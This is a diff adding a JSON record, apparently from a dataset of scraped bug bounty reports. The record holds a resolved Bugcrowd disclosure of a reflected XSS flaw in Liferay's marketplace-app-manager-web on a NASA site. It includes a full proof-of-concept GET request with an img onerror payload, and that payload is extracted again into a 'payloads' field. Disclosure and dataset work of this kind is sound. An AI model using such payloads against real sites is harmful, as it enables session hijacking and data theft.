@@ -1,0 +1,25 @@
+{
+  "schema": "bbreport.xss.v1",
+  "title": "CVE-2025-4388 Reflected XSS in marketplace-app-manager-web. - CrowdStream - Bugcrowd",
+  "vuln_type": "xss",
+  "vuln_type_raw": null,
+  "submitted_at": "2025-07-17T13:40:06Z",
+  "platform": "bugcrowd",
+  "report_url": "https://bugcrowd.com/disclosures/7e4f036b-c115-4ca3-9090-96947eaaf61f/cve-2025-4388-reflected-xss-in-marketplace-app-manager-web",
+  "target_site": "dml.msfc.nasa.gov",
+  "report_body": "CVE-2025-4388 Reflected XSS in marketplace-app-manager-web. - CrowdStream - Bugcrowd\n\nHacker Login\n\nCustomer Login\n\nCrowdStream\n\nCVE-2025-4388 Reflected XSS in marketplace-app-manager-web.\n\nCVE-2025-4388 Reflected XSS in marketplace-app-manager-web.\n\nDisclosed by\n\nRenatto\n\nEngagement\n\nNational Aeronautics and Space Administration (NASA) - Vulnerability Disclosure Program\n\nDisclosed date\n\n17 Jul 2025\n9 months ago\n\nPriority\n\nP3\n\nBugcrowd's VRT priority rating\n\nStatus\n\nResolved\n\nThis vulnerability has been accepted and fixed\n\nSummary by Renatto\n\nNASA Marshall Space Flight Center (MSFC) Directives Master List (DML) (dml.msfc.nasa.gov) is vulnerable to a reflected cross-site scripting (XSS) vulnerability in Liferay Portal and Liferay DXP which allows an remote non-authenticated attacker to inject JavaScript into the \nmodules/apps/marketplace/marketplace-app-manager-web\n\nWhen an attacker can control code that is executed within a user’s browser, they are able to carry out any actions that the user is able to perform, including accessing any of the user's data and modifying information within the user’s permissions. This can result in modification, deletion, or theft of data, including accessing or deleting files, or stealing session cookies which an attacker could use to hijack a user’s session.\n\nProof of Concept (PoC)\n\nGET /o/marketplace-app-manager-web/icon.jsp?iconURL=https:///%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(%27Renatto%27)%3E HTTP/1.1\nHost: dml.msfc.nasa.gov\nSec-Ch-Ua: \"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nAccept-Language: en-GB,en;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\nConnection: keep-alive\n\nActivity\n\nRenatto\n\nAll-time points\n\n45\n\nAccuracy\n\n100.0%\n\nCurrent rank\n\n4826th\n\nPriority percentile",
+  "discovered_at": "2026-04-26T13:42:22.359882+00:00",
+  "source": {
+    "fetched_at": "2026-04-26T13:42:22.359903+00:00",
+    "http_status": 200
+  },
+  "extracted": {
+    "payloads": [
+      "Proof of Concept (PoC)",
+      "GET /o/marketplace-app-manager-web/icon.jsp?iconURL=https:///%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(%27Renatto%27)%3E HTTP/1.1"
+    ],
+    "affected_urls": [
+      "https:///%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(%27Renatto%27"
+    ]
+  }
+}
